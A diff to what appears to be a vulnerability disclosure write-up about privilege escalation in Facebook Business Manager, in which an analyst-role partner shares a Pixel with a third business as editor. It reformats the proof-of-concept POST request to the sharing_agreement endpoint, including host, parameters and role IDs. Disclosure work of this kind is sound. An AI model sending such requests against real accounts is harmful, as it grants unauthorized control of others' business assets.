@@ -29,8 +29,12 @@ A partner business granted the analyst role on a Pixel could abuse the `business
 2. **Attacker** uses the endpoint `business/objects/sharing_agreement/` to create a sharing agreement referencing a third party business (**Business_C**), supplying permitted roles that include editor privileges.
 
 ### 📤 Request
-```
-POST /business/objects/sharing_agreement/?from_business_id={ID_Business_B}&asset_id={ID_Pixel_A}&asset_type=pixel&to_business_id={ID_Business_C}&top_permitted_roles[0]=187605565181235&top_permitted_roles[1]=213091122906638&relationship_type[0]=Agency&relationship_type[1]=Ad%20Manager&other_relationship=
+```http
+POST /business/objects/sharing_agreement/ HTTP/1.1
+Host: business.facebook.com
+Content-Type: application/x-www-form-urlencoded
+
+&from_business_id={ID_Business_B}&asset_id={ID_Pixel_A}&asset_type=pixel&to_business_id={ID_Business_C}&top_permitted_roles[0]=187605565181235&top_permitted_roles[1]=213091122906638&relationship_type[0]=Agency&relationship_type[1]=Ad%20Manager&other_relationship=
 ```
 
 ### ✅ Response
